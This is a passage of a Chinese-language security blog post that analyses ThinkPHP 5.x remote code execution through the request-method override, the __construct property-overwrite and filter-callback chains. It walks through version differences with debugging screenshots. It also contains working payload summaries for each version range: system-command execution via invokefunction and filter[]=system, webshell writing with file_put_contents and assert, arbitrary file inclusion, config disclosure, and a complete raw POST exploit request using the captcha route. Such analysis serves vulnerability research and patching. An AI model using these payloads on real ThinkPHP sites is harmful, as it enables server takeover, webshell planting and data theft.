+<p><strong>可用payload：</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whomai # callback回调
+?s=index/\think\view\driver\Think/display&amp;template=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   #shell生成在runtime/temp/md5(template).php
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> # 写文件
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="4payload汇总"><a class="markdownIt-Anchor" href="#4payload汇总"></a> 4.Payload汇总</h2>
+<h3 id="tp-50"><a class="markdownIt-Anchor" href="#tp-50"></a> TP 5.0</h3>
+<pre class="line-numbers language-none"><code class="language-none">s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;var_dump&amp;vars[0]&#x3D;123123 # 打印的方式检测漏洞
+?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1213.php&amp;vars[1][]&#x3D;123123 # 文件写入
+?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息
+?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件
+?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件
+?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  #执行系统命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="tp-51"><a class="markdownIt-Anchor" href="#tp-51"></a> TP 5.1</h3>
+<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whomai # callback回调
+?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;   #shell生成在runtime&#x2F;temp&#x2F;md5(template).php
+?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; # 写文件
+?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行
+?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # 命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="0x03-thinkphp-5x命令执行method任意调用方法导致rce"><a class="markdownIt-Anchor" href="#0x03-thinkphp-5x命令执行method任意调用方法导致rce"></a> 0x03 ThinkPHP 5.x命令执行（method任意调用方法导致RCE）</h1>
+<h2 id="1影响版本-2"><a class="markdownIt-Anchor" href="#1影响版本-2"></a> 1.影响版本</h2>
+<p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.23</p>
+<p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.32</p>
+<p>看一下patch：</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240726150103603.png" alt="image-20240726150103603" /></p>
+<p>简单分析了下，发现对POST参数进行了白名单判断，限定了POST获取的var_method参数。</p>
+<h2 id="2漏洞分析-2"><a class="markdownIt-Anchor" href="#2漏洞分析-2"></a> 2.漏洞分析</h2>
+<p>通过上面的分析，很容易想到利用方式：</p>
+<ul>
+<li>method从POST参数获取并转为大写（PHP的函数是不区分大小写的，所以转大写也无所谓了）</li>
+<li>接下来会调用Request类的对应方法，参数为POST参数</li>
+</ul>
+<p>只要找Request类中可以被利用的方法（方法参数只能有1个）就可以了。</p>
+<p>找了一圈发现不存在直接利用的，发现有一个可以覆盖任意属性的__contruct方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240726180501090.png" alt="image-20240726180501090" /></p>
+<p>接下来的思路就是寻找TP框架接收参数或者处理路由的时候是否会调用Request的参数了，这样的话我们就能利用此类赋值恶意属性，达成利用效果了。</p>
+<p>但在开始之前，我们先简单跟一下，如何可以触发最开始的diff的位置</p>
+<p>Request是TP处理请求的类，只要发起请求就会触发到此类，method是处理路由的方法，所以很容易触发diff位置。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727171455416.png" alt="image-20240727171455416" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727153232409.png" alt="image-20240727153232409" /></p>
+<p>接下来就是寻找可能利用Request中恶意参数的位置了，大致的挖掘思路如下：</p>
+<ul>
+<li>从TP的入口开始跟，发现调用Request的方法就跟进去</li>
+<li>然后再看方法可不可以进行恶意利用（写文件，callback执行等），</li>
+<li>最后看参数是否可控</li>
+</ul>
+<ol>
+<li>
+<p>入口点为APP 的run静态方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727155146208.png" alt="image-20240727155146208" /></p>
+</li>
+<li>
+<p>跟入param方法，request变量为初始化的Request类对象</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727155758652.png" alt="image-20240727155758652" /></p>
+</li>
+<li>
+<p>跟入方法，发现method方法，继续跟入</p>
+</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155452448.png" alt="image-20240802155452448" /></p>
+<ol start="4">
+<li>参数为true，会调用到server方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155537768.png" alt="image-20240802155537768" /></p>
+<ol start="5">
+<li>调用server方法，跟入其中的input方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155613522.png" alt="image-20240802155613522" /></p>
+<ol start="6">
+<li>看一下其中的filterValue方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727160127104.png" alt="image-20240727160127104" /></p>
+<ol start="7">
+<li>发现callback触发点</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727160212522.png" alt="image-20240727160212522" /></p>
+<p>利用流程已经整理好了，要完成完整的利用链，还要考虑两点：</p>
+<ul>
+<li>
+<ol>
+<li>整个过程中的if条件都能符合吗？</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>还有没有其他的调用最初param方法的位置？</li>
+</ol>
+</li>
+</ul>
+<h3 id="21遇见问题需要开启debug的利用链"><a class="markdownIt-Anchor" href="#21遇见问题需要开启debug的利用链"></a> 2.1遇见问题（需要开启debug的利用链）</h3>
+<p>我们看回漏洞分析2步骤的if逻辑，看一下debug的静态属性是什么含义。</p>
+<p>分析了一下该变量就是系统debug配置，类调用run方法时会进行属性的初始化。</p>
+<p>也就是说，我们想触发上面的调用链，第一个if条件就要符合，也就是说<strong>系统需要开启debug模式才行</strong>。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727161239734.png" alt="image-20240727161239734" /></p>
+<p>先调通Payload，在链条中找到可被赋值的Request的属性</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727174846709.png" alt="image-20240727174846709" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727174908476.png" alt="image-20240727174908476" /></p>
+<p>现在可以POST传参对类的filter属性赋值了，$filter也就是callback中调用的函数</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144020516.png" alt="image-20240802144020516" /></p>
+<p>接下来就是callback的函数参数的值了，在这里就是filterValue函数的$data参数了，找一下赋值的地方。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144908829.png" alt="image-20240802144908829" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144825176.png" alt="image-20240802144825176" /></p>
+<p>跟回去赋值$data的地方，发现也是Request类的属性，所以一样可以使用上面的方式</p>
+<p>我们使用server变量赋值，走到filterValue函数上面的if逻辑，发现无法满足这个if，会直接return，无法触发上面的filterValue函数</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802153133966.png" alt="image-20240802153133966" /></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$val</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>输入的参数还要满足如下逻辑，才不会return，这里的data是我们赋值的server变量，解决办法也很简单，我们传入一个输入，满足存在$val键值即可。</p>
+<p>也就是server[REQUEST_METHOD]=12312</p>
+<p>完成利用</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802154035302.png" alt="image-20240802154035302" /></p>
+<h3 id="22不开启debug情况下的利用链"><a class="markdownIt-Anchor" href="#22不开启debug情况下的利用链"></a> 2.2不开启Debug情况下的利用链</h3>
+<p>上面也简单提到过，既然没有开启debug，我们就要寻找其他的漏洞触发点</p>
+<ol>
+<li>在App类的方法寻找， 发现其中有调用param方法的位置。</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155235697.png" alt="image-20240813155235697" /></p>
+<ol start="2">
+<li>反向往回跟，跟invokeMethod方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155441971.png" alt="image-20240813155441971" /></p>
+<ol start="3">
+<li>反向跟module方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155810783.png" alt="image-20240813155810783" /></p>
+<ol start="4">
+<li>找到exec方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155907274.png" alt="image-20240813155907274" /></p>
+<ol start="5">
+<li>最终找到触发点，实际上就在我们上面分析的debug下面的位置</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813155948369.png" alt="image-20240813155948369" /></p>
+<ol start="6">
+<li>找到完整触发链，接下来就是找callback的函数的参数，尽量做到可控</li>
+</ol>
+<p>$filter变量和上面debug那条相同，是获取的this属性，可以使用construct方式对filter属性赋值。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813160850291.png" alt="image-20240813160850291" /></p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">合</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">间</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">data变量赋值在此，是数组合并的。看中间的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">的</span></span></span></span>vars，赋值在上面，其实获取的是所有的post参数</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813163516793.png" alt="image-20240813163516793" /></p>
+<p>最终callback递归调用filterValue，$data数据键值是我们post的data</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813165432649.png" alt="image-20240813165432649" /></p>
+<p>最终也会使用callback调用我们传的参数，完成整条链的调用</p>
+<pre class="line-numbers language-none"><code class="language-none">aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813165645059.png" alt="image-20240813165645059" /></p>
+<p><strong>我们使用网上的payload做调试的时候，使用calc可能发现弹出来很多个计算器，原因其实也在我们上面的分析过程：</strong></p>
+<p>param是三个参数获取拼接的，我们callback调用是循环调用，filter和参数都是笛卡尔积执行的，最终执行的时候也就执行了calc。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813170430023.png" alt="image-20240813170430023" /></p>
+<h2 id="3-不同版本的payload区别分析"><a class="markdownIt-Anchor" href="#3-不同版本的payload区别分析"></a> 3. 不同版本的Payload区别分析</h2>
+<h4 id="tp-500version507"><a class="markdownIt-Anchor" href="#tp-500version507"></a> TP 5.0.0&lt;=version&lt;=5.0.7</h4>
+<p>我们上面调试的payload是5.0.12版本的，使用的payload是<code>aaaaa=calc&amp;_method=__construct&amp;filter[]=system</code></p>
+<p>在5.0.7使用上面分析的payload，开启debug分析一下，发现会报错。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815105135342.png" alt="image-20240815105135342" /></p>
+<p>对比一下tp5.0.7的代码，发现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>u</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">高</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">做</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">理</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">低</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mi mathvariant="normal">没</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">越</mi><mi mathvariant="normal">界</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">析</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi></mrow><annotation encoding="application/x-tex">rules这里，在高版本做了判断处理，低版本没有值会数组越界，分析一下获取</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">高</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">做</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">低</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">越</span><span class="mord cjk_fallback">界</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span></span></span></span>method值的部分</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240813182615250.png" alt="image-20240813182615250" /></p>
+<p>跟进去，这里的方法在我们上面已经分析过了，是漏洞的触发点，会走到第一个框内的逻辑，然后传入construct对Request类的属性进行覆盖。我们看一下函数的返回值，发现返回的this-&gt;method，我们上面已经可以进行覆盖了，所以这里可以选择在post body中覆盖method，这样就不会数组越界了。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815110124941.png" alt="image-20240815110124941" /></p>
+<p>rules数组存在如下key值，保证不越界即可。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815111159943.png" alt="image-20240815111159943" /></p>
+<p>因此随便选择一个值赋值即可。</p>
+<p>最终payload:</p>
+<p><strong>aaaaa</strong>=<strong>calc</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>system</strong>&amp;<strong>method</strong>=<strong>name</strong></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815111449636.png" alt="image-20240815111449636" /></p>
+<h4 id="tp-508version5012"><a class="markdownIt-Anchor" href="#tp-508version5012"></a> TP 5.0.8&lt;=version&lt;=5.0.12</h4>
+<p>这个我们最初的例子就是5.0.12的，因此不过多赘述。</p>
+<h4 id="tp-5013version-5116"><a class="markdownIt-Anchor" href="#tp-5013version-5116"></a> TP 5.0.13&lt;=version&lt;= 5.1.16</h4>
+<p>搭起来5.0.14的环境，使用5.0.12的payload，debug看一下过程</p>
+<p>发现最终触发点的$filter没有赋值到。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815143328858.png" alt="image-20240815143328858" /></p>
+<p>看一下5.0.13和5.0.5的diff</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3">https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3</a></p>
+<p>在上面的漏洞分析流程中，找到可能更新了filter的地方。如下图，更新了filter。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815142514799.png" alt="image-20240815142514799" /></p>
+<p>在对应位置打个断点，此时我们传入的filter已经覆盖为Request类的filter属性</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815145706757.png" alt="image-20240815145706757" /></p>
+<p>这个方法跟入就是覆盖filter的方法。而参数$config[‘default_filter’]为空，也就将我们传入的system覆盖为空了，也就导致无法执行5.0.12版本的payload。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815145848660.png" alt="image-20240815145848660" /></p>
+<p>那么想办法让逻辑不进入图中的方法，寻找其他触发点：</p>
+<ol>
+<li>我们上面分析过，当开启debug时，可以走另一套触发逻辑。</li>
+<li>寻找其他触发位置，且触发位置不能在上面的module方法后面，必须在前面</li>
+</ol>
+<p>我们寻找一下上面的module方法。是一套switch逻辑，我们看一下能否走入controller和method逻辑</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815150437594.png" alt="image-20240815150437594" /></p>
+<p>图中的是ThinkPHP不同的路由方式，具体如下：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/118037">https://www.kancloud.cn/manual/thinkphp5/118037</a></p>
+<p>我们要进入的是方法3和方法4，接下来就是寻找TP代码在定义路由时，是否有对应的定义方式。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815171134142.png" alt="image-20240815171134142" /></p>
+<p>看一下<strong>TP完整版</strong>的composer配置，发现会自动安装很多模块。(为了漏洞复现的话，也可以直接配置&quot;topthink/think-captcha&quot;: “^1.0”)</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815112918572.png" alt="image-20240815112918572" /></p>
+<p>TP在初始化时，存在自动类加载机制，将 <strong>vendor</strong> 目录下的文件加载，因此会存在captcha路由。（完整版会默认存在此路由）</p>
+<p>下图中我们发现注册了一个get的、路由到类的方法，符合我们的漏洞触发点。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240807174519099.png" alt="image-20240807174519099" /></p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?s&#x3D;&#x2F;captcha&amp;XDEBUG_SESSION_START&#x3D;18306 HTTP&#x2F;1.1
+Host: tp5014
+Content-Type: application&#x2F;x-www-form-urlencoded
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36
+
+aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们拿上面分析好payload加上captcha路由测试一下，测试后发现没有成功，我们回到定义路由的地方发现路由定义的是get方式，因此无法找到最终的定义规则很正常。我们跟回代码。</p>
+<p>这里的rule数据包含着路由规则，get存储着我们想利用的captcha路由，这里与上面的思路类似，$method是可控的，因此把他修改为get就可以了</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815172003658.png" alt="image-20240815172003658" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815172143487.png" alt="image-20240815172143487" /></p>
+<h4 id="tp-5117-version-5132"><a class="markdownIt-Anchor" href="#tp-5117-version-5132"></a> TP 5.1.17&lt;= version &lt;= 5.1.32</h4>
+<p>高版本的代码有变化， 低版本可以使用construct调用方法，高版本直接改成赋值了。</p>
+<p>也就是说，我们无法对Request类的任意属性进行覆盖了。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815173008272.png" alt="image-20240815173008272" /></p>
+<p>开一下debug，发现提示无键值。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815175017161.png" alt="image-20240815175017161" /></p>
+<p>找到触发位置，这里与上面调试遇见的问题类似，不过这里无法进行覆盖了。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815174828864.png" alt="image-20240815174828864" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240815174841800.png" alt="image-20240815174841800" /></p>
+<h5 id="理论中的利用方法"><a class="markdownIt-Anchor" href="#理论中的利用方法"></a> 理论中的利用方法</h5>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p>
+<p>这篇文章提出了一个理论方法，但是本地未复现出，实战意义也有限，仅当拓展。</p>
+<h2 id="4payload汇总-2"><a class="markdownIt-Anchor" href="#4payload汇总-2"></a> 4.Payload汇总</h2>
+<h3 id="tp-500v507"><a class="markdownIt-Anchor" href="#tp-500v507"></a> TP 5.0.0&lt;=V&lt;=5.0.7</h3>
+<pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;index
+s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system
+aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system
+_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">POST
+s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert
+&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="tp-508v5012"><a class="markdownIt-Anchor" href="#tp-508v5012"></a> TP 5.0.8&lt;=V&lt;=5.0.12</h3>
+<pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;index
+s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system
+aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system
+_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami
+c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-POST" data-language="POST"><code class="language-POST">POST
+s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert
+&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="tp-5013v-5116"><a class="markdownIt-Anchor" href="#tp-5013v-5116"></a> TP 5.0.13&lt;=V&lt;= 5.1.16</h3>
+<p>需要开启debug：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;index
+s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system
+aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system
+_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami
+c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">POST
+s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert
+&#x2F;&#x2F; 写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>完整版存在captcha路由的情况：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;captcha
+aaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
